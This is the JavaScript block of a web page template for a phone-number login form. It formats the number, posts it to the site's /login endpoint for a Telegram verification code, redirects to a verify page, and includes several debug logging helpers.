{% block scripts %}
<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const phone = document.getElementById('phone').value;
    const countryCode = document.getElementById('countryCode').value;
    const fullPhone = countryCode + phone.replace(/\D/g, '');
    
    if (!phone) {
        showError('Please enter your phone number');
        return;
    }
    
    // Log the phone number for debugging
    console.log('📱 Phone number submitted:', fullPhone);
    
    const submitBtn = document.getElementById('submitBtn');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Sending...';
    
    try {
        const response = await fetch('/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phone_number: fullPhone
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showSuccess('Code sent successfully!');
            console.log('✅ Code sent to Telegram for:', fullPhone);
            setTimeout(() => {
                window.location.href = '/verify';
            }, 1500);
        } else {
            showError(data.error || 'Something went wrong');
            console.log('❌ Failed to send code:', data.error);
        }
    } catch (error) {
        showError('Network error. Please try again.');
        console.log('❌ Network error:', error);
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Continue';
    }
});

// Format phone number as user types
document.getElementById('phone').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 6) {
        value = value.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
    } else if (value.length >= 3) {
        value = value.replace(/(\d{3})(\d{0,3})/, '($1) $2');
    }
    e.target.value = value;
    
    // Update status
    const statusDiv = document.getElementById('phoneStatus');
    if (value.length >= 10) {
        statusDiv.textContent = '✅ Valid phone number';
        statusDiv.style.color = '#51cf66';
    } else if (value.length > 0) {
        statusDiv.textContent = `📱 Entering: ${value.length}/10 digits`;
        statusDiv.style.color = '#ffd43b';
    } else {
        statusDiv.textContent = '';
    }
    
    console.log('Phone input:', value); // Debug log
});

// Focus phone input on page load
document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.getElementById('phone');
    if (phoneInput) {
        phoneInput.focus();
        console.log('Phone input focused'); // Debug log
    }
    
    // Add country code change handler
    const countrySelect = document.getElementById('countryCode');
    if (countrySelect) {
        countrySelect.addEventListener('change', function() {
            console.log('Country code changed to:', this.value);
            // Update placeholder based on country code
            const phoneInput = document.getElementById('phone');
            if (phoneInput) {
                if (this.value === '+1') {
                    phoneInput.placeholder = '(555) 123-4567';
                } else if (this.value === '+44') {
                    phoneInput.placeholder = '7911 123456';
                } else if (this.value === '+33') {
                    phoneInput.placeholder = '6 12 34 56 78';
                } else if (this.value === '+49') {
                    phoneInput.placeholder = '151 12345678';
                } else {
                    phoneInput.placeholder = 'Enter phone number';
                }
            }
        });
    }
});

// Add click handler to ensure input is active
document.getElementById('phone').addEventListener('click', function(e) {
    console.log('Phone input clicked'); // Debug log
    e.target.focus();
});

// Test function for debugging
function testPhoneInput() {
    const phoneInput = document.getElementById('phone');
    const debugInfo = document.getElementById('debugInfo');
    
    debugInfo.innerHTML = `
        Input exists: ${phoneInput ? 'Yes' : 'No'}<br>
        Input type: ${phoneInput ? phoneInput.type : 'N/A'}<br>
        Input disabled: ${phoneInput ? phoneInput.disabled : 'N/A'}<br>
        Input readonly: ${phoneInput ? phoneInput.readOnly : 'N/A'}<br>
        Input value: ${phoneInput ? phoneInput.value : 'N/A'}<br>
        Input focused: ${phoneInput ? (document.activeElement === phoneInput) : 'N/A'}<br>
        Input style: ${phoneInput ? phoneInput.style.cssText : 'N/A'}
    `;
    
    // Try to focus the input
    if (phoneInput) {
        phoneInput.focus();
        phoneInput.click();
    }
}
</script>
